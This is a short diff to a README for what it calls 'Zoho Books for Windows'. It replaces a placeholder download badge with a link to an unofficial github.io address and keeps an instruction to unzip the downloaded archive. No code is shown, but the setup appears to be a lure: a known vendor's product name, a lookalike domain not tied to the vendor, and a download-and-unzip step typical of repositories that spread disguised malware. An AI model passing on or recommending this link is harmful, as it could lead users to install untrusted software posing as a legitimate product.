@@ -6,7 +6,7 @@ Zoho Books for Windows brings comprehensive accounting, invoicing, and expense m
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://zoho-books-windows-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
